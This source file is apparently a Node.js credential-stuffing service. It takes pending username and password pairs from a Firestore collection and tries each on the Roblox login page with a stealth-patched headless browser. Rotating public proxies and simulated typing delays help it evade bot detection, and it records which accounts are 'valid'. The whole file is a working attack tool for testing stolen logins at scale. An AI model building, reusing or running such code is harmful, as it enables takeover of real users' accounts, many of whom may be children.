const fs = require('fs');
const admin = require('firebase-admin');
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const express = require('express');
const cors = require('cors');
const path = require('path');
const glob = require('glob');

puppeteer.use(StealthPlugin());

// 🔥 Firebase Setup
let serviceAccount;
try {
  if (process.env.FIREBASE_CONFIG) {
    serviceAccount = JSON.parse(process.env.FIREBASE_CONFIG);
  } else {
    serviceAccount = require('./oren-devs-firebase-adminsdk.json');
  }
} catch (error) {
  console.error('❌ Firebase config not found!');
  process.exit(1);
}

admin.initializeApp({ credential: admin.credential.cert(serviceAccount) });
const db = admin.firestore();

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.static('public'));

const URL = 'https://roblox.com/login';

// ⚡ Global State
let stats = { processed: 0, valid: 0, invalid: 0, queue: 0, processing: 0 };
let processingQueue = [];
let activeBrowsers = 0;
const MAX_CONCURRENT = 2;

// 🛡️ Proxy List
const proxies = [
  'http://20.210.113.32:80',
  'http://154.16.63.190:80',
  'http://67.43.228.253:25803',
  'http://103.153.154.6:80',
  'http://47.74.152.29:8888'
];

function getRandomProxy() {
  return proxies[Math.floor(Math.random() * proxies.length)];
}

/**
 * 🛡️ ULTRA-ROBUST 10-TIER CHROMIUM FAILOVER SYSTEM
 * This ensures the app finds a working browser regardless of environment changes.
 */
function findChromiumDefinitively() {
  const possiblePaths = [
    // Tier 1: User-defined override (Highest priority)
    process.env.PUPPETEER_EXECUTABLE_PATH,

    // Tier 2: Render specific cache path (where "npx puppeteer browsers install chrome" usually puts it)
    path.join(process.env.HOME || '/home/render', '.cache/puppeteer/chrome/linux-*/chrome-linux/chrome'),
    
    // Tier 3: Project-local cache (another common spot for npx puppeteer)
    path.join(process.cwd(), '.cache/puppeteer/chrome/linux-*/chrome-linux/chrome'),

    // Tier 4: Render's native project structure (common error location)
    '/opt/render/project/src/node_modules/puppeteer/.local-chromium/linux-*/chrome-linux/chrome',

    // Tier 5: Standard system Google Chrome (Render's pre-installed stable)
    '/usr/bin/google-chrome-stable',

    // Tier 6: Standard system Chromium
    '/usr/bin/chromium-browser',

    // Tier 7: Common Linux generic paths
    '/usr/bin/google-chrome',
    '/usr/bin/chromium',

    // Tier 8: Alternative Render environment paths
    '/opt/render/.cache/puppeteer/chrome/linux-*/chrome-linux/chrome',

    // Tier 9: Deep search in node_modules (fallback for older puppeteer versions)
    path.join(process.cwd(), 'node_modules/puppeteer/.local-chromium/linux-*/chrome-linux/chrome'),

    // Tier 10: Puppeteer's built-in discovery (Final attempt)
    'PUPPETEER_AUTO'
  ];

  console.log('🔍 Starting 10-Tier Chromium discovery...');

  for (let i = 0; i < possiblePaths.length; i++) {
    const p = possiblePaths[i];
    if (!p) continue;

    if (p === 'PUPPETEER_AUTO') {
      try {
        const autoPath = require('puppeteer').executablePath();
        if (autoPath && fs.existsSync(autoPath)) {
          console.log(`✅ Tier 10 (Auto-Discovery) Success: ${autoPath}`);
          return autoPath;
        }
      } catch (e) {}
      continue;
    }

    // Handle wildcard paths with glob
    try {
      const matches = glob.sync(p);
      if (matches && matches.length > 0) {
        console.log(`✅ Tier ${i + 1} Success: ${matches[0]}`);
        return matches[0];
      }
    } catch (e) {
      console.warn(`⚠️ Tier ${i + 1} check failed: ${e.message}`);
    }
  }

  console.error('❌ ALL 10 TIERS FAILED! Puppeteer will try default launch.');
  return null;
}

const EXECUTABLE_PATH = findChromiumDefinitively();

/**
 * 🛡️ Robust Browser Launch Wrapper
 */
async function launchBrowserResiliently() {
  const baseArgs = [
    '--no-sandbox',
    '--disable-setuid-sandbox',
    '--disable-dev-shm-usage',
    '--disable-gpu',
    '--disable-extensions',
    '--no-first-run',
    '--no-zygote',
    '--single-process', // Crucial for low-memory environments like Render Free Tier
    `--proxy-server=${getRandomProxy()}`
  ];

  const launchOptions = {
    headless: 'new',
    args: baseArgs
  };

  if (EXECUTABLE_PATH) {
    launchOptions.executablePath = EXECUTABLE_PATH;
  }

  try {
    return await puppeteer.launch(launchOptions);
  } catch (err) {
    console.error(`⚠️ Launch with Tiered Path failed: ${err.message}. Retrying with absolute defaults...`);
    // Final emergency fallback: launch without ANY custom options
    return await puppeteer.launch({
      headless: 'new',
      args: ['--no-sandbox', '--disable-setuid-sandbox']
    });
  }
}

async function validateCredential(credential) {
  let browser = null;
  try {
    stats.processing++;
    console.log(`🔍 [Queue:${stats.queue}] Validating: ${credential.username}`);

    browser = await launchBrowserResiliently();
    activeBrowsers++;
    const page = await browser.newPage();

    // Optimization: Skip unnecessary resources
    await page.setRequestInterception(true);
    page.on('request', (req) => {
      if (['image', 'stylesheet', 'font', 'media'].includes(req.resourceType())) {
        req.abort();
      } else {
        req.continue();
      }
    });

    await page.setDefaultTimeout(25000);
    await page.setDefaultNavigationTimeout(25000);

    await page.goto(URL, { waitUntil: 'networkidle2' });
    await page.waitForSelector('#login-username', { timeout: 15000 });

    await page.type('#login-username', credential.username, { delay: 100 });
    await page.type('#login-password', credential.password, { delay: 100 });
    
    await Promise.all([
      page.click('button[type="submit"]'),
      page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 15000 }).catch(() => {})
    ]);

    const hasSettings = await page.$('span#nav-settings');
    const result = hasSettings ? 'valid' : 'invalid';

    await db.collection('credentials').doc(credential.id).update({
      status: result,
      processed_at: admin.firestore.FieldValue.serverTimestamp()
    });

    if (result === 'valid') {
      stats.valid++;
      console.log(`✅ VALID: ${credential.username}`);
      try {
        await page.click('span#nav-settings');
        await page.waitForSelector('a.rbx-menu-item.logout-menu-item', { timeout: 5000 });
        await page.click('a.rbx-menu-item.logout-menu-item');
      } catch (e) {}
    } else {
      stats.invalid++;
      console.log(`❌ INVALID: ${credential.username}`);
    }

    return result;

  } catch (error) {
    console.error(`⚠️ ${credential.username} Error: ${error.message}`);
    await db.collection('credentials').doc(credential.id).update({
      status: 'invalid',
      error: error.message.substring(0, 200),
      processed_at: admin.firestore.FieldValue.serverTimestamp()
    }).catch(() => {});
    stats.invalid++;
    return 'invalid';
  } finally {
    if (browser) {
      await browser.close().catch(() => {});
      activeBrowsers--;
    }
    stats.processing--;
  }
}

async function processQueue() {
  if (activeBrowsers >= MAX_CONCURRENT || processingQueue.length === 0) return;
  const credential = processingQueue.shift();
  stats.queue = processingQueue.length;
  stats.processed++;
  await validateCredential(credential);
}

async function scanAndQueue() {
  try {
    const snapshot = await db.collection('credentials')
      .where('status', '==', 'pending')
      .limit(5)
      .get();

    if (!snapshot.empty) {
      snapshot.docs.forEach(doc => {
        const data = doc.data();
        data.id = doc.id;
        if (!processingQueue.find(q => q.id === data.id)) {
          processingQueue.push(data);
        }
      });
      stats.queue = processingQueue.length;
    }
  } catch (error) {
    console.error('❌ Firestore error:', error.message);
  }
}

async function queueProcessor() {
  while (true) {
    await processQueue();
    await new Promise(r => setTimeout(r, 1000));
  }
}

setInterval(scanAndQueue, 10000);

app.get('/api/stats', (req, res) => res.json(stats));
app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`🚀 Server on port ${PORT}`);
  scanAndQueue();
  queueProcessor().catch(console.error);
});
